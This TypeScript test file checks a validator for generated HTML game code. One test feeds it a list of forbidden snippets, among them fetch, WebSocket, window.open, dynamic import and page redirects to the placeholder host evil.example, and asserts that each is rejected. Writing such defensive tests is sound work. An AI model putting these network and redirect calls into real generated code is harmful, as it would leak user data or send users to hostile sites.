import assert from "node:assert/strict";
import { test } from "node:test";
import { GAME_TYPES, generateGameOffline, validateGameCode } from "./index";

test("every built-in game type passes the hardened validator", () => {
  for (const meta of GAME_TYPES) {
    const game = generateGameOffline(`make a ${meta.id} game`, meta.id);
    const result = validateGameCode(game.code);
    assert.equal(result.ok, true, `${meta.id}: ${JSON.stringify(result)}`);
  }
});

test("validator rejects network, navigation and embedding primitives by name", () => {
  // Padded past the completeness heuristic so the ONLY reason for rejection
  // is the forbidden-API check being exercised.
  const pad = `<!-- ${"padding for the completeness heuristics ".repeat(30)} -->`;
  const wrap = (body: string) =>
    `<!doctype html><html><head><title>t</title></head><body><canvas id="game"></canvas>` +
    `<script>function __hud(score){} var score=0; requestAnimationFrame(function loop(){score++;__hud(score);requestAnimationFrame(loop);});` +
    `addEventListener("keydown",function(){});addEventListener("touchstart",function(){});addEventListener("pointerdown",function(){});` +
    `${body}</script>${pad}</body></html>`;
  const bad = [
    'fetch("https://evil.example/x")',
    "new XMLHttpRequest()",
    'new WebSocket("wss://evil.example")',
    'navigator.sendBeacon("/x")',
    'window.open("https://evil.example")',
    'top.location = "https://evil.example"',
    'location.href = "https://evil.example"',
    'import("https://evil.example/m.js")',
    'importScripts("x.js")',
  ];
  for (const code of bad) {
    const result = validateGameCode(wrap(code));
    assert.equal(result.ok, false, code);
    assert.ok(
      result.issues.some((issue) => issue.includes("network, navigation or embedding")),
      `${code}: expected the forbidden-API issue, got ${JSON.stringify(result.issues)}`,
    );
  }
  const iframe = validateGameCode(wrap("").replace('<canvas id="game"></canvas>', '<iframe src="https://evil.example"></iframe><canvas id="game"></canvas>'));
  assert.equal(iframe.ok, false);
});
